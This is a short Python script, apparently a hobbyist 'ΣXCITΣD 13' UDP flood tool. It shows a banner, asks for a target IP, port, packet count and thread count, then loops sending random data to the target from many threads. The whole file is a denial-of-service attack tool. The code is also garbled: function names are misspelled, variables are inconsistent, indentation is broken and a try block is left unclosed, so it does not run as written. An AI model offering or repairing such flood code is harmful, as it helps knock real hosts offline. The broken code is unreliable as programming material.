#AUTHOR BY ΣXCITΣD 13
#GakUsahLuRenameKontol
import random
import socket
import threading
import os
import sys

os.system("clear")

print("""\033[1;31;40m


████████████████████████████████████████
█▄─▄▄─█▄─▀─▄█─▄▄▄─█▄─▄█─▄─▄─█▄─▄▄─█▄─▄▄▀█
██─▄█▀██▀─▀██─███▀██─████─████─▄█▀██─██─█
▀▄▄▄▄▄▀▄▄█▄▄▀▄▄▄▄▄▀▄▄▄▀▀▄▄▄▀▀▄▄▄▄▄▀▄▄▄▄▀▀""")

print("========= ΣXCITΣD 13 ========")
print("=== AUTHOR BY : ΣXCITΣD 13 ===")
print("===========  V1.0  ===========")

ip = str(input(" IP :")) 
port = int(input(" Port :"))
choice = str(input(" GAS? [Y/N] :")) 
times = int(input(" PACKETS :")) 
threads = str(input(" THREADS :")) 
def run():
 data = random_urandom(105)
i = random.choice(("[+]","[!]"))
while True:
 try: 
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   addr = (str(ip).int(port))
   for x in range(times):
     s.sendto(data, andress)
   print(i +"ΣXCITΣD ₳₮₮₳₵₭")
  except:
   print("DOWN ΣXCITΣD!!!")

def run2():
 data = random_urandom(15)
i = random.choice (("[+]","[!]"))
while True:
 try:
   s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   s.connect((ip,port)) 
   s.send(data)
   for x in range(times):
     s.send(data)
   print(i +"ΣXCITΣD ₳₮₮₳₵₭")
     s.close()
   print("[!] ΣXCITΣD")
   
for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = run)
    th.start()
  else:
    th = threading.Thread(target = run2)
    th.start()